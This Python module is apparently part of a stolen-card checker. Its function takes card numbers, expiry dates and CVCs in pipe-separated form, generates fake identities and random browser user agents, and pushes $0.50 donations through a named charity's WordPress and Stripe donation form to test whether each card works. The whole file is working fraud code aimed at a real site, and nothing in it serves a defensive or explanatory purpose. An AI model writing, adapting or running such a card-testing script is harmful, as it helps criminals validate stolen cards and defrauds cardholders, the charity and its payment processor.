from .util import __extract_str
import requests
import random
import json
import uuid

def check_letstalkaboutloss(cc, identity):
	
	try:

		gate_url = "https://letstalkaboutloss.org/donate/"
		gate2_url = "https://letstalkaboutloss.org/wp-admin/admin-ajax.php"
		gate_user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/{}.{}".format(random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		gate_check_amount = "0.50" # USD

		splitted_card = cc.split('|')

		payment_header = {
			"Content-type": "application/x-www-form-urlencoded", 
			"User-agent": gate_user_agent
		}
													# name+surname
		payment_data = "type=card&billing_details[name]={}&card[number]={}&card[exp_month]={}&card[exp_year]={}&card[cvc]={}&guid={}&muid={}sid={}&pasted_fields=number&payment_user_agent=stripe.js%2Fe63c37019%3B+stripe-js-v3%2Fe63c37019&time_on_page=79139&key=pk_live_51Hq05QCfie30VsJ52UsV7ZGsWFDdo3x1EInUUhwrQ8FNRnjZLtpZCMweDYlE9VkJST9vWPvnfDlXcPcqcIgi6MpT00Rw5S4H8g".format(identity["results"][0]["name"]["first"] + '+' + identity["results"][0]["name"]["last"],
			splitted_card[0],
			splitted_card[1],
			splitted_card[2],
			splitted_card[3],
			str(uuid.uuid4()),
			str(uuid.uuid4()),
			str(uuid.uuid4()))

		payment_request = requests.post(gate_url, headers=payment_header, data=payment_data)

		if payment_request.status_code < 300:

			wp_id = __extract_str(payment_request.text, 'name="wpforms[id]" value="', '"')
			wp_post_id = __extract_str(payment_request.text, 'name="wpforms[post_id]" value="', '"')
			wp_token = __extract_str(payment_request.text, 'data-token="', '"')

			try:

				id_ = payment_request.json()["id"]

			except: return False

			payment_data = "wpforms[fields][0]={}&wpforms[fields][1]={}&wpforms[fields][13][address1]={}&wpforms[fields][13][address2]=&wpforms[fields][13][city]={}&wpforms[fields][13][state]={}&wpforms[fields][13][postal]={}&wpforms[fields][13][country]={}&wpforms[fields][2]={}&wpforms[fields][9]=Single payment&wpforms[fields][3]=&wpforms[stripe-credit-card-cardname]={}&wpforms[id]={}&wpforms[author]=1&wpforms[post_id]={}&wpforms[payment_method_id]={}&wpforms[token]={}&action=wpforms_submit&page_url=https://letstalkaboutloss.org/donate/".format(identity["results"][0]["name"]["last"],
   				identity["results"][0]["email"],
   				identity["results"][0]["location"]["street"],
   				identity["results"][0]["location"]["city"],
   				identity["results"][0]["location"]["state"],
   				identity["results"][0]["location"]["postcode"],
   				identity["results"][0]["nat"],
   				gate_check_amount,
   				identity["results"][0]["name"]["first"] + '+' + identity["results"][0]["name"]["last"],
   				wp_id,
   				wp_post_id,
   				id_,
   				wp_token)
    
			payment_request = requests.post(gate2_url,
				headers=payment_header,
				data=payment_data)

			if payment_request.status_code < 300:

				return True

			else: return False

		else: return False

	except Exception as E: raise E